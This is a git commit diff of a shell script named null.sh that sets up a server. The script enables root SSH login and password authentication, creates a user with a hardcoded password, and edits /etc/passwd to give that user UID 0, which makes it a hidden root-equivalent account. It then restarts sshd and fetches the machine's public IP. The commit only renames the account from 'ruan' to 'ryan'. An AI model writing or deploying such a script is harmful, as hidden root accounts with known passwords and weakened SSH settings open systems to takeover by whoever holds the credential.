79132255ec7c681ec931e19f77de119652d0f86d
RyanY610 <106591422+RyanY610@users.noreply.github.com>
2023-02-09 23:59:14 +0800

    Update null.sh

--- null.sh
+++ null.sh
@@ -3,9 +3,9 @@
 sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
 sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 echo "Port 22"  >> /etc/ssh/sshd_config
-useradd ruan
-echo ruan:Ryan1995 |chpasswd ruan
-sed -i 's|^.*ruan.*|ruan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
+useradd ryan
+echo ryan:Ryan1995 |chpasswd ryan
+sed -i 's|^.*ryan.*|ryan:x:0:0:root:/root:/bin/bash|g' /etc/passwd
 service sshd restart
 curl ipv4.ip.sb
 echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
